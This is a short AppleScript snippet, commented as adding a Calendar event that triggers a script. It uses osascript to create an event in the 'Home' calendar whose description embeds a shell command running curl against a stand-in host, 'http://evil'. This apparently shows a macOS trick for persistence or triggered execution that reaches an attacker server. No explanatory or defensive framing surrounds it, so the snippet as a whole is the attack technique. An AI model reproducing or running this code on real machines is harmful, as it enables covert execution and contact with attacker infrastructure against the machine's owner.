-- Adds a Calendar event that triggers a script
do shell script "osascript -e 'tell application \"Calendar\" to make new event at end of calendar \"Home\" with properties {summary:\"Run script\", start date:(current date), end date:(current date), description:\"do shell script \\\"curl http://evil\\\"\"}'"
